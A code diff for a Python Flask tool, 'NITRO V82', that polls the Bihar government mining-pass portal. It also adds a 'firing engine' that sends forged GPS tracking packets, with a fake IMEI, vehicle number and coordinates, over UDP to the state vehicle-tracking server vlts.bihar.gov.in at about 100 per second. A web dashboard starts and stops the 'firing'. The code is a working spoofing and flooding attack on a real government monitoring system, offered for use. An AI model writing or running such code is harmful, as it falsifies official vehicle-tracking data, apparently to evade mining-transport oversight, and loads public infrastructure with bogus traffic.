@@ -33,7 +33,7 @@ HTML_V82 = """
 </head>
 <body>
     <div class="box">
-        <h3>🚀 NITRO V82 KHANAN-SPEC</h3>
+        <h3>🚀 NITRO V82 GHOP-GHOP</h3>
         <div class="metric" id="cnt">0</div>
         <div class="status-bar">
             📡 Portal: <span id="ps">{{p_stat}}</span><br>
@@ -68,3 +68,63 @@ HTML_V82 = """
     </script>
 </body>
 </html>
+"""
+
+def fetch_khanansoft():
+    session = requests.Session()
+    session.headers.update({'User-Agent': 'Mozilla/5.0 Chrome/120.0.0.0'})
+    url = "https://khanansoft.bihar.gov.in/portal/ePass/ViewPassDetailsNew.aspx"
+    while True:
+        if status["firing"]:
+            try:
+                # Simulasi PostBack Logic
+                res = session.get(url, timeout=5)
+                status["p_stat"] = "FETCHING..."
+                # Yahan logic date nikalne ka...
+                status["p_date"] = datetime.now().strftime("%d-%b-%Y %H:%M")
+                status["sync"] = datetime.now().strftime("%H:%M:%S")
+                status["p_stat"] = "LIVE SYNC ACTIVE"
+            except: status["p_stat"] = "PORTAL TIMEOUT"
+        time.sleep(5)
+
+def firing_engine():
+    target = ("vlts.bihar.gov.in", 9999)
+    while status["firing"]:
+        try:
+            now = datetime.now()
+            pkt = f"$PVT,{status['tag']},2.1.1,NR,01,L,{status['imei']},{status['vno']},1,{now.strftime('%d%m%Y')},{now.strftime('%H%M%S')},{status['lat']},N,{status['lon']},E,0.0,0.0,11,73,0.8,0.8,airtel,1,1,11.5,4.3,0,C,26,404,73,0a,e3,e3,0a,7,e3,0a,7,c7,0a,10,e3,0a,0,0001,00,000041,DDE3*".encode()
+            if status["proto"] == "UDP":
+                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+                for _ in range(100):
+                    if not status["firing"]: break
+                    sock.sendto(pkt, target); status["count"] += 1
+                sock.close()
+            time.sleep(1)
+        except: time.sleep(2)
+
+@app.route('/')
+def home(): return render_template_string(HTML_V82, **status)
+
+@app.route('/data')
+def data(): return jsonify(status)
+
+@app.route('/action', methods=['POST'])
+def action():
+    val = request.form.get('btn')
+    status.update({
+        "tag": (request.form.get('tag') or "EGAS").upper(),
+        "imei": (request.form.get('imei') or "862567075041793").upper(),
+        "vno": (request.form.get('vno') or "BR03GB9117").upper(),
+        "lat": request.form.get('lat') or "25.65",
+        "lon": request.form.get('lon') or "84.78",
+        "proto": request.form.get('proto', 'UDP')
+    })
+    if val == "start" and not status["firing"]:
+        status["firing"] = True
+        threading.Thread(target=firing_engine, daemon=True).start()
+    elif val == "stop": status["firing"] = False
+    return home()
+
+if __name__ == "__main__":
+    threading.Thread(target=fetch_khanansoft, daemon=True).start()
+    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 5000)))
